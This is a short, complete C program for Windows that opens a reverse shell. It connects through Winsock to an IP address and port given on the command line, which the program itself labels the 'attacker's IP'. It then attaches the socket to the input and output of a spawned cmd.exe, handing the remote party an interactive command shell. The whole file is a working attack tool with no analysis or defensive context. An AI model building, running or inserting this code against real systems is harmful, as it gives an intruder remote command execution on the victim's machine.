#include <stdio.h>
#include <stdlib.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <ws2ipdef.h>
#pragma comment(lib, "ws2_32.lib")


void get_error()
{
	wchar_t* s = NULL;
	FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, WSAGetLastError(),
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPWSTR)&s, 0, NULL);
	printf("%ls\n", s);
	LocalFree(s);
}

int main(int argc, char* argv[])
{
	WSADATA wsa;
	SOCKET sock = INVALID_SOCKET;
	STARTUPINFO sui;
	PROCESS_INFORMATION pi;
	sockaddr_in sin;

	// Check user input
	if (argc != 3) {
		printf("Usage: %s <attacker's IP> <port>\n", argv[0]);
		printf("Examples:\n");
		printf("\t%s 127.0.0.1 7777\n", argv[0]);
		printf("\t%s 192.168.1.10 8080\n", argv[0]);
		exit(0);
	}

	// Attacker IP and port
	char* ip = argv[1];
	int port = atoi(argv[2]);

	// Load Winsock 2 dll
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
		printf("Failed to load Winsock dll. ");
		get_error();
		exit(0);
	}

	// Create socket
	sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
	if (sock == INVALID_SOCKET) {
		printf("Failed to create socket. ");
		get_error();
		exit(0);
	}

	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	inet_pton(AF_INET, ip, &sin.sin_addr.s_addr);

	// Connect to attacker machine
	if (WSAConnect(sock, (SOCKADDR*)&sin, sizeof(sin), NULL, NULL, NULL, NULL) == INVALID_SOCKET) {
		printf("Failed to connect to server. ");
		get_error();
		exit(0);
	}

	// Set up input, output, error pipeline
	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)sock;

	// Create process to run cmd.exe
	char cmd[20] = "cmd.exe";
	LPSTR str_pointer = cmd;
	CreateProcess(NULL, str_pointer, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return 0;
}

